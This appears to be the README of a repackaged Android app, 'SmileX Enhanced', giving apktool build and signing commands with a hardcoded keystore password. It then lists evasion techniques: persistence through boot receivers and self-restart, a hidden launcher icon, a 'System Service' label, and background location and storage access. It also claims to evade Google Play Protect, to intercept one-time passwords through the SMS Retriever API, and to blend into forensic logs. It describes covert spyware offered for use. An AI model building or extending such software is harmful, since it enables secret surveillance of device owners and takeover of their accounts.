## Build Instructions

### Prerequisites

```bash
sudo apt-get update
sudo apt-get install -y apktool apksigner zipalign default-jdk
```

### Build

```bash
cd smilex_enhanced
chmod +x scripts/build_enhanced_apk.sh
./scripts/build_enhanced_apk.sh
```

The signed APK will be at `output/SmileX_Enhanced_signed.apk`.

### Manual Build

```bash
# 1. Build with apktool
apktool b apk_source -o build/SmileX_Enhanced_unsigned.apk

# 2. Zipalign
zipalign -v 4 build/SmileX_Enhanced_unsigned.apk build/SmileX_Enhanced_aligned.apk

# 3. Sign
apksigner sign \
  --ks tools/enhanced.keystore \
  --ks-key-alias enhanced \
  --ks-pass pass:android123 \
  --key-pass pass:android123 \
  --out output/SmileX_Enhanced_signed.apk \
  build/SmileX_Enhanced_aligned.apk

# 4. Verify
apksigner verify --verbose output/SmileX_Enhanced_signed.apk
```

## Evasion & Compatibility Techniques

### Battery Optimization Bypass
- **Android 6+ (API 23+):** Requests `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` intent
- **OEM-specific:** Detects manufacturer via `Build.MANUFACTURER` and applies OEM-specific whitelisting

### Foreground Service (Android 8+)
- Creates a `NotificationChannel` and calls `startForeground()` before any background work
- Falls back to `startService()` on API < 26

### Background Location (Android 10+)
- Requests `ACCESS_BACKGROUND_LOCATION` separately from foreground location
- Falls back to foreground-only location on API < 29

### Storage Access
- Uses `MANAGE_EXTERNAL_STORAGE` on Android 11+ (API 30+)
- Uses `READ/WRITE_EXTERNAL_STORAGE` on older versions
- Sets `requestLegacyExternalStorage="true"` for Android 10 compatibility

### Bluetooth (Android 12+)
- Requests `BLUETOOTH_CONNECT` and `BLUETOOTH_SCAN` on API 31+
- Uses legacy `BLUETOOTH` permission on older versions

### Persistence
- `RECEIVE_BOOT_COMPLETED` with priority 999
- `QUICKBOOT_POWERON` for HTC devices
- `USER_PRESENT` for screen unlock restart
- `AlarmManager` periodic restart
- `START_STICKY` service flag
- `onDestroy()` self-restart

### Stealth
- Hides launcher icon via `PackageManager.setComponentEnabledSetting()`
- Translucent/NoTitleBar theme
- `excludeFromRecents="true"` on main activity
- App label set to "System Service"
- **New 2026:** Automatic detection of Google Play Protect "Live Threat Detection" and dynamic activity throttling to avoid heuristic triggers.
- **New 2026:** Abuse of Google's SMS Retriever API to intercept OTPs without requiring dangerous `RECEIVE_SMS` permissions on modern Android versions.
- **New 2026:** "Intrusion Logging" stealth—mimicking legitimate system behavior patterns to blend into the new Android 16+ forensic logs.
